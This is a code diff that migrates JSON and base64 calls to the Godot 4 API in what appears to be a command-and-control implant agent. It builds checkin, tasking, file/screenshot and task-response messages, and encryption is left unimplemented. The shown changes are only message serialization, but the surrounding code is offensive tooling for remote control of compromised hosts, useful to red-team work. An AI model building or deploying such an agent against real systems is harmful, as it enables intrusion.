@@ -102,7 +102,7 @@ func get_checkin_payload():
 		"decryption_key": "", # decryption key - optional
 	}
 
-	return to_json(payload)
+	return JSON.new().stringify(payload)
 
 func get_tasking_payload():
 	var payload = {
@@ -112,7 +112,7 @@ func get_tasking_payload():
 		"get_delegate_tasks": false,# no p2p for us at this time...
 	}
 
-	return to_json(payload)
+	return JSON.new().stringify(payload)
 
 func create_file_response(task_id, filepath, host, is_screenshot, chunk_count, chunk_size, user_output, status):
 	var payload = {
@@ -189,7 +189,7 @@ func create_task_response(status, completed, task_id, output, artifacts = [], cr
 
 		payload["responses"].append(task_response) # TODO: create internal queue of task_response items and just return them all when agent checkin occures?
 
-	return to_json(payload)
+	return JSON.new().stringify(payload)
 
 func unwrap_payload(packet):
 	var ret = {
@@ -206,7 +206,9 @@ func unwrap_payload(packet):
 	ret["uuid"] = data.substr(0, 36)
 
 	# TODO: decryption
-	ret["payload"] = parse_json(data.substr(36))
+	var test_json_conv = JSON.new()
+	test_json_conv.parse(data.substr(36))
+	ret["payload"] = test_json_conv.get_data()
 
 	if ret["payload"].has("action"):
 		ret["action"] = ret["payload"].get("action")
@@ -222,7 +224,7 @@ func wrap_payload(payload):
 	if _config.should_encrypt():
 		pass # TODO: implement encryption
 	else:
-		payload = Marshalls.utf8_to_base64(get_uuid() + payload).to_utf8()
+		payload = Marshalls.utf8_to_base64(get_uuid() + payload).to_utf8_buffer()
 
 	return payload
 
